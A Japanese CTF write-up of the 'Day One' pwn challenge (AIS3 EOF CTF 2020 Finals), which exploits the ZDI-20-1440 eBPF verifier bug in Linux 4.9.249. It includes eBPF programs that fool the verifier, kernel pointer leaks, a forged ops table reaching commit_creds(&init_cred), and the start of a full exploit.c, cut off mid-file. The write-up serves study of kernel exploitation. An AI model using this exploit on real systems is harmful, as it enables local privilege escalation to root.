@@ -1,0 +1,922 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>eBPF /  verifier bug /  kernel exploit /  commit_creds(&amp;init_cred) /  without bpf_map.btf
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p></p>
+<h3>1: イントロ</h3>
+<p>いつぞや開催された <strong>AIS3 EOF CTF 2020 Finals</strong>  (全く知らないCTF...)。そのpwn問題である <strong>Day One</strong> を解いていく。先に言うと本問題は去年公開されたLinuxKernelのeBPF verifierのバグを題材にした問題であり、元ネタは<a href="https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier">ZDI</a>から公開されている。オリジナルのauthorは<a href="https://twitter.com/ga_ryo_">TWの人</a>で、問題のauthorは<a href="https://twitter.com/h3xr4bb1t">HexRabbit</a>さん。</p>
+<p></p>
+<h3>2: static</h3>
+<h4>basic</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">basic.sh</div>
+<pre class="prettyprint linenums lang-sh">
+/ $ cat /proc/version
+Linux version 4.9.249 (root@kernel-builder) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04) ) #8 SMP Mon1
+/ $ cat /proc/sys/net/core/bpf_jit_enable
+1
+
+qemu-system-x86_64 \
+  -kernel bzImage \
+  -initrd rootfs.cpio.gz \
+  -append &quot;console=ttyS0 oops=panic panic=-1 kaslr quiet&quot; \
+  -monitor /dev/null \
+  -nographic \
+  -cpu qemu64,+smep,+smap \
+  -m 256M \
+  -virtfs local,path=$SHARED_DIR,mount_tag=shared,security_model=passthrough,readonly
+</pre>
+<p></p>
+<p>デバッグ用なのか、こちらで指定するディレクトリをvirtfsでマウントしてくれる(今回は関係ない)。</p>
+<p>SMEP有効・SMAP有効・KAISER有効・oops-&gt;panic。</p>
+<p></p>
+<h4>patch</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">patch.diff</div>
+<pre class="prettyprint linenums lang-diff">
+diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
+index 335c002..08dca71 100644
+--- a/kernel/bpf/verifier.c
++++ b/kernel/bpf/verifier.c
+@@ -352,7 +352,7 @@ static void print_bpf_insn(const struct bpf_verifier_env *env,
+ 			u64 imm = ((u64)(insn + 1)-&gt;imm &lt;&lt; 32) | (u32)insn-&gt;imm;
+ 			bool map_ptr = insn-&gt;src_reg == BPF_PSEUDO_MAP_FD;
+ 
+-			if (map_ptr &amp;&amp; !env-&gt;allow_ptr_leaks)
++			if (map_ptr &amp;&amp; !capable(CAP_SYS_ADMIN))
+ 				imm = 0;
+ 
+ 			verbose(&quot;(%02x) r%d = 0x%llx\n&quot;, insn-&gt;code,
+@@ -3627,7 +3627,7 @@ int bpf_check(struct bpf_prog **prog, union bpf_attr *attr)
+ 	if (ret &lt; 0)
+ 		goto skip_full_check;
+ 
+-	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);
++	env-&gt;allow_ptr_leaks = true;
+ 
+ 	ret = do_check(env);
+ 
+@@ -3731,7 +3731,7 @@ int bpf_analyzer(struct bpf_prog *prog, const struct bpf_ext_analyzer_ops *ops,
+ 	if (ret &lt; 0)
+ 		goto skip_full_check;
+ 
+-	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);
++	env-&gt;allow_ptr_leaks = true;
+ 
+ 	ret = do_check(env);
+</pre>
+<p>うーむ、なんというか<a href="https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier">ZDI-20-1440</a>で<code>CAP_SYS_ADMIN</code>がないとできないこと()を無理やり修正してる。若干予定調和感が否めないな。</p>
+<p></p>
+<h3>3: vuln</h3>
+<h4>ZDI-20-1440</h4>
+<p>verifierのregister rangeの更新ミス。利用しているkernelが上記からも分かるとおり、 <strong>4.9.249</strong> であり、これは影響を受けている数少ないバージョンの一つである。以下のように<code>adjust_reg_min_max_vals()</code>において<code>BPF_RSH</code>演算の際に<code>dst_reg</code>の値の更新をミスっている。まんまZDI-20-1440のままである。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">kernel/bpf.verifier.c</div>
+<pre class="prettyprint linenums lang-c">
+	case BPF_RSH:
+ 	/* RSH by a negative number is undefined, and the BPF_RSH is an
+ 	 * unsigned shift, so make the appropriate casts.
+ 	 */
+ 	if (min_val &lt; 0 || dst_reg-&gt;min_value &lt; 0)
+ 		dst_reg-&gt;min_value = BPF_REGISTER_MIN_RANGE;
+ 	else
+ 		dst_reg-&gt;min_value =
+ 			(u64)(dst_reg-&gt;min_value) &gt;&gt; min_val;
+ 	if (dst_reg-&gt;max_value != BPF_REGISTER_MAX_RANGE)
+ 		dst_reg-&gt;max_value &gt;&gt;= max_val;
+ 	break;
+</pre>
+<p></p>
+<h4>patchの意味</h4>
+<p>そもそもZDI-20-1440がLPEまで繋がらなかったのは、 <strong>mapを指すポインタに対する加法を行うのにCAP_SYS_ADMIN</strong> が必要だったからである。<code>BPF_ALU64(BPF_ADD)</code>を行う際には、<code>do_check()</code>において以下のように<code>check_alu_op()</code>が呼び出され、それが加算であり、且つdstレジスタの中身が<code>PTR_TO_MAP_VALUE</code>又は<code>PTR_TO_MAP_VALUE_ADJ</code>でない場合には、レジスタを完全に <strong>unknown</strong> でマークしてしまう(<code>[S64_MIN,S64_MAX]</code>にされる)。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">do_check()@kernel/bpf/verifier.c</div>
+<pre class="prettyprint linenums lang-c">
+		if (class == BPF_ALU || class == BPF_ALU64) {
+			err = check_alu_op(env, insn);
+			if (err)
+				return err;
+
+		} else if (class == BPF_LDX) {
+</pre>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">check_alu_op()@kernel/bpf/verifier.c</div>
+<pre class="prettyprint linenums lang-c">
+		if (env-&gt;allow_ptr_leaks &amp;&amp;
+		    BPF_CLASS(insn-&gt;code) == BPF_ALU64 &amp;&amp; opcode == BPF_ADD &amp;&amp;
+		    (dst_reg-&gt;type == PTR_TO_MAP_VALUE ||
+		     dst_reg-&gt;type == PTR_TO_MAP_VALUE_ADJ))
+			dst_reg-&gt;type = PTR_TO_MAP_VALUE_ADJ;
+		else
+			mark_reg_unknown_value(regs, insn-&gt;dst_reg);
+	}
+</pre>
+<p>それではこの<code>env-&gt;allow_ptr_leaks</code>がいつセットされるかと言うと、<code>bpf_check()</code>で<code>do_check()</code>を呼び出す直前に<code>CAP_SYS_ADMIN</code>を持っているかどうかで判断している。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">bpf_check()@kernel/bpf/verifier.c</div>
+<pre class="prettyprint linenums lang-c">
+	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);
+
+	ret = do_check(env);
+</pre>
+<p>即ち、<code>CAP_SYS_ADMIN</code>がないと<code>allow_ptr_leaks</code>が<code>true</code>にならず、したがってmapに対する加算が全てunknownでマークされてしまうため、<a href="https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">mapに対するOOBの攻撃</a>ができなくなってしまうというわけである。</p>
+<p>今回のパッチは、2つ目と3つ目でこの制限を取り払い<code>allow_ptr_leaks</code>を常に<code>true</code>にしている(1つ目はlog表示のことなので関係ない)。</p>
+<p></p>
+<h4>最新のkernelでは</h4>
+<p>最初にZDIの該当レポートを読んだ時、mapポインタに対する加算が<code>CAP_SYS_ADMIN</code>がないとダメだということにちょっと驚いた。というのも、<a href="https://smallkirby.hatenablog.com/entry/2021/01/31/210158">TWCTFのeepbf</a>をやったときには、この権限がない状態でmapを操作してAAWに持っていったからだ。というわけで新しめのkernelを見てみると、<code>check_alu_op()</code>において該当の処理が消えていた。すなわち、mapポインタに対する加法はそれがmapの正答なメモリレンジ内にある限りnon-adminに対しても許容されるようになっていた(勿論レンジのチェックは<code>check_map_access()</code>において行われる)。</p>
+<p></p>
+<h4>というか、pointer leakが任意に可能じゃん...</h4>
+<p>というか、<code>allow_ptr_leaks</code>が<code>true</code>になっているため、任意にポインタをリークすることができる。例えば、以下のようなeBPFプログラムで(rootでなくても)簡単にmapのアドレスがleakできる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">stack_leak.c</div>
+<pre class="prettyprint linenums lang-c">
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &amp;cmap[0]
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_8)
+</pre>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">result.sh</div>
+<pre class="prettyprint linenums lang-sh">
+/ $ ./mnt/exploit
+[80] 0xffff88000e300a90
+[88] 0xffff88000e300a90
+[96] 0xffff88000e300a90
+[104] 0xffff88000e300a90
+[112] 0xffff88000e300a90
+[120] 0xffff88000e300a90
+[128] 0xffff88000e300a90
+[136] 0xffff88000e300a90
+</pre>
+<p>うーん、お題のために制限をゆるくしすぎてる気がするなぁ。。。</p>
+<p></p>
+<p></p>
+<h3>4: leak kernbase</h3>
+<h4>0に見える1をつくる</h4>
+<p>こっからは作業ゲーです。</p>
+<p>まずは以下のBPFコードでverifierからは0に見えるような1をつくる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">make_1_looks_0.c</div>
+<pre class="prettyprint linenums lang-c">
+    /* get cmap[0] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
+    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &amp;cmap[0]
+    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &amp;cmap[0]
+    /* get cmap[1] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
+    /* fix r6/r7 range */
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0&lt;=R6&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0&lt;=R7&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    // exploit r6 range 
+    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 &gt;&gt;= r7 (r6 regarded as 0, actually 1)
+    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
+    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),               // r6 *= N
+</pre>
+<p>但し、<code>control_map</code>はサイズ8、要素数10のARRAYである。<code>[0]</code>には常に1を入れ、<code>[1]</code>には常に0を入れておく。前半はただ<code>control_map</code>から0と1を取得しているだけである。<code>fix r6/r7 range</code>と書いてあるところでバグを利用して0に見える1を作っている。ジャンプ命令が多いのは、R6/R7の上限と下限をそれぞれ1,0にするためである。最後に、<code>BPF_NEG</code>にしているのは、leakの段階ではleakしたいものが負の方向にあるからである。最後に <strong>定数のN</strong> をかけてOOB(R)を達成している。尚、このNをmapから取ってきたような値にすると、MULの時にverifierがdstをunknownにマークしてしまうため、プログラムをロードする度に定数値をNに入れて毎回動的にロードしている(前回eBPF問題を解いた時はNをmapから取得した値にして何度もverifierに怒られた...)。</p>
+<p>実際にlog表示を見てみると、以下のようにR6は0と認識されていることが分かる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">verifier-log.txt</div>
+<pre class="prettyprint linenums lang-txt">
+from 28 to 31: R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=inv,min_value=0,max_value=1 R7=inv,min_value=0 R8=map_valup
+31: (75) if r7 s&gt;= 0x2 goto pc+1
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=inv,min_value=0,max_value=1 R7=inv,min_value=0,max_value=1 R8=map_value(p
+32: (05) goto pc+2
+35: (7f) r6 &gt;&gt;= r7
+36: (87) r6 neg 0
+37: (27) r6 *= 136
+38: (0f) r9 += r6
+39: (79) r3 = *(u64 *)(r9 +0)
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=inv,min_value=0,max_value=0 R7=inv,min_value=0,max_value=1 R8=map_value(p
+40: (7b) *(u64 *)(r8 +0) = r3
+</pre>
+<p></p>
+<h4>leak from bpf_map.ops</h4>
+<p>今回はmap typeとしてARRAYを選択しているため、<code>struct bpf_array</code>と<code>struct bpf_map</code>が使われる。構造体はそれぞれ以下のとおり。</p>
+<p></p>
+<p></p>
+<p></p>
+<p>この内、<code>bpf_map.ops</code>は、<code>kernel/bpf/arraymap.c</code>で定義されるように<code>array_ops</code>が入っている。これをleakすることでkernbaseをleakしたことになる。</p>
+<p></p>
+<p></p>
+<p>厳密にmapから<code>ops</code>までのオフセットを計算するのは面倒くさいため適当に検討をつけてみてみると、以下のようになる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">leak-bpf_map-ops.c</div>
+<pre class="prettyprint linenums lang-c">
+  int N=0x80;
+  for(int ix=N/8; ix!=N/8+8; ++ix){
+    printf(&quot;[%d] 0x%lx\n&quot;, ix*0x8, read_rel(ix*0x8));
+  }
+ 
+ / # ./mnt/exploit
+[128] 0xa00000008
+[136] 0x400000002
+[144] 0xffffffff81a12100 &lt;-- こいつ
+[152] 0x0
+[160] 0x0
+[168] 0x0
+[176] 0x0
+[184] 0x0
+</pre>
+<p></p>
+<h3>5: AAR via bpf_map_get_info_by_id() [FAIL]</h3>
+<p>以前解いた<a href="https://smallkirby.hatenablog.com/entry/2021/01/31/210158">eebpf</a>では、<code>bpf_map.btf</code>を書き換えて<code>bpf_map_get_info_by_id()</code>を呼び出すことでAARを実現できた。だが上の<code>bpf_map</code>構造体を見て分かるとおり、 <strong>bpf_map.bfpというメンバは存在していない</strong> 。kernelが古いからね...。というわけで、この方法によるAARは諦める。</p>
+<p></p>
+<h3>6: forge ops and commit_creds(&amp;init_cred) directly</h3>
+<p>本問では、上述したようにmap自体のアドレスを容易にleakすることができる。また、<code>bpf_map</code>の全てを自由に書き換えることができる。よって、mapの中にfake function tableを用意しておいて、<code>bpf_map.ops</code>をこれに向ければ任意の関数を実行させることができる。取り敢えず、以下のようにするとRIPが取れる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">rip-poc.c</div>
+<pre class="prettyprint linenums lang-c">
+  const ulong fakeops_addr = controlmap_addr + 0x10;
+  int N = 0x90;
+  struct bpf_insn reader_insns[] = {
+    /* get cmap[0] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
+    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &amp;cmap[0]
+    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &amp;cmap[0]
+    /* get cmap[1] */
+    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
+    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
+    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
+    BPF_EXIT_INSN(),
+    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
+    /* fix r6/r7 range */
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0&lt;=R6&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7&gt;=0
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0&lt;=R7&lt;=1
+    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    // exploit r6 range 
+    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 &gt;&gt;= r7 (r6 regarded as 0, actually 1)
+    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
+    BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),                // r7 = r6
+    // overwrite ops into forged ops
+    BPF_MOV64_IMM(BPF_REG_1, (fakeops_addr&gt;&gt;32) &amp; 0xFFFFFFFFUL),
+    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, fakeops_addr &amp; 0xFFFFFFFFUL),
+    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),
+    BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),       // r8 += r6
+    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0),
+    
+    // Go Home
+    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
+    BPF_EXIT_INSN()
+  };
+
+  int evilwriter= create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));
+  if(evilwriter &lt; 0){
+    errExit(&quot;reader not initialized&quot;);
+  }
+
+  // setup fake table
+  for(int ix=0; ix!=7; ++ix){
+    array_update(control_map, ix+2, 0xcafebabedeadbeef);
+  }
+
+  array_update(control_map, 0, 1);
+  array_update(control_map, 1, 0);
+  trigger_proc(evilwriter);
+  const ulong tmp = get_ulong(control_map, 0);
+</pre>
+<p></p>
+<p></p>
+<p>ここでOopsが起きた原因は、用意したfaketableの+0x20にアクセスし、不正なアドレス0xcafebabedeadbeefにアクセスしようとしたからである。ジャンプテーブルの+0x20というのは<code>map_lookup_elem()</code>である。</p>
+<p></p>
+<p></p>
+<p></p>
+<p>さて、このようにRIPを取ることはできるが、問題はもとの関数テーブルの全ての関数の第一引数が<code>struct bpf_map *map</code>であるということである。つまり、第一引数は任意に操作することができない。よって、関数の中でいい感じに第二引数以降を利用していい感じの処理をしてくれる関数があると嬉しい。その観点で<code>kernel/bpf/arraymap.c</code>を探すと、<code>fd_array_map_delete_elem()</code>が見つかる。これは、<code>perf_event_array_ops</code>とか<code>prog_array_ops</code>とかのメンバである。(尚、<code>map_array_ops</code>の該当メンバである<code>array_map_delete_elem()</code>は<code>-EINVAL</code>を返すだけのニート関数である。お前なんて関数やめてインラインになってしまえばいい)。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">kernel/bpf/arraymap.c</div>
+<pre class="prettyprint linenums lang-c">
+static int fd_array_map_delete_elem(struct bpf_map *map, void *key)
+{
+	struct bpf_array *array = container_of(map, struct bpf_array, map);
+	void *old_ptr;
+	u32 index = *(u32 *)key;
+
+	if (index &gt;= array-&gt;map.max_entries)
+		return -E2BIG;
+
+	old_ptr = xchg(array-&gt;ptrs + index, NULL);
+	if (old_ptr) {
+		map-&gt;ops-&gt;map_fd_put_ptr(old_ptr);
+		return 0;
+	} else {
+		return -ENOENT;
+	}
+}
+</pre>
+<p><code>xchg()</code>は、第一引数の指すポインタの指す先に第二引数の値を入れて、古い値を返す関数である。そしてその先で<code>map-&gt;ops-&gt;map_fd_put_ptr(old_ptr)</code>を呼んでくれる。つまり、<code>array-&gt;ptrs</code>の指す先に<code>&amp;init_cred</code>を入れておいて、<code>map-&gt;ops-&gt;map_fd_put_ptr</code>を<code>commit_creds</code>に書き換えれば<code>commit_creds(&amp;init_cred)</code>を直接呼んだことになる。やったね！</p>
+<p></p>
+<p>一つ注意として、<code>execve()</code>でシェルを呼んでしまうと、socketが解放されてその際にmapの解放が起きてしまう。テーブルを書き換えているためその時にOopsが起きて死んでしまう。よってシェルは<code>system(&quot;/bin/sh&quot;)</code>で呼ぶ。</p>
+<p></p>
+<p></p>
+<h3>7: exploit</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/shm.h&gt;
+
+// eBPF-utils
+#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))
+#define BPF_REG_ARG1    BPF_REG_1
+#define BPF_REG_ARG2    BPF_REG_2
+#define BPF_REG_ARG3    BPF_REG_3
+#define BPF_REG_ARG4    BPF_REG_4
+#define BPF_REG_ARG5    BPF_REG_5
+#define BPF_REG_CTX     BPF_REG_6
+#define BPF_REG_FP      BPF_REG_10
+
+#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
+    .dst_reg = DST,                             \
+    .src_reg = SRC,                             \
+    .off   = 0,                                 \
+    .imm   = (__u32) (IMM) }),                  \
+  ((struct bpf_insn) {                          \
+    .code  = 0, /* zero is reserved opcode */   \
+    .dst_reg = 0,                               \
+    .src_reg = 0,                               \
+    .off   = 0,                                 \
+    .imm   = ((__u64) (IMM)) &gt;&gt; 32 })
+#define BPF_LD_MAP_FD(DST, MAP_FD)              \
+  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
+#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
+    .dst_reg = DST,                             \
+    .src_reg = SRC,                             \
+    .off   = OFF,                               \
+    .imm   = 0 })
+#define BPF_MOV64_REG(DST, SRC)                 \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+    .dst_reg = DST,                             \
+    .src_reg = SRC,                             \
+    .off   = 0,                                 \
+    .imm   = 0 })
+#define BPF_ALU64_IMM(OP, DST, IMM)             \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
+    .dst_reg = DST,                             \
+    .src_reg = 0,                               \
+    .off   = 0,                                 \
+    .imm   = IMM })
+#define BPF_ALU32_IMM(OP, DST, IMM)             \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
+    .dst_reg = DST,                             \
+    .src_reg = 0,                               \
+    .off   = 0,                                 \
+    .imm   = IMM })
+#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
+    .dst_reg = DST,                             \
+    .src_reg = SRC,                             \
+    .off   = OFF,                               \
+    .imm   = 0 })
+#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
+    .dst_reg = DST,                             \
+    .src_reg = 0,                               \
+    .off   = OFF,                               \
+    .imm   = IMM })
+#define BPF_EMIT_CALL(FUNC)                     \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_JMP | BPF_CALL,                \
+    .dst_reg = 0,                               \
+    .src_reg = 0,                               \
+    .off   = 0,                                 \
+    .imm   = (FUNC) })
+#define BPF_JMP_REG(OP, DST, SRC, OFF)				  \
+  ((struct bpf_insn) {					                \
+    .code  = BPF_JMP | BPF_OP(OP) | BPF_X,      \
+    .dst_reg = DST,					                    \
+    .src_reg = SRC,					                    \
+    .off   = OFF,					                      \
+    .imm   = 0 })
+#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
+    .dst_reg = DST,                             \
+    .src_reg = 0,                               \
+    .off   = OFF,                               \
+    .imm   = IMM })
+#define BPF_EXIT_INSN()                         \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_JMP | BPF_EXIT,                \
+    .dst_reg = 0,                               \
+    .src_reg = 0,                               \
+    .off   = 0,                                 \
+    .imm   = 0 })
+#define BPF_LD_ABS(SIZE, IMM)                   \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
+    .dst_reg = 0,                               \
+    .src_reg = 0,                               \
+    .off   = 0,                                 \
+    .imm   = IMM })
+#define BPF_ALU64_REG(OP, DST, SRC)             \
+  ((struct bpf_insn) {                          \
+    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
+    .dst_reg = DST,                             \
+    .src_reg = SRC,                             \
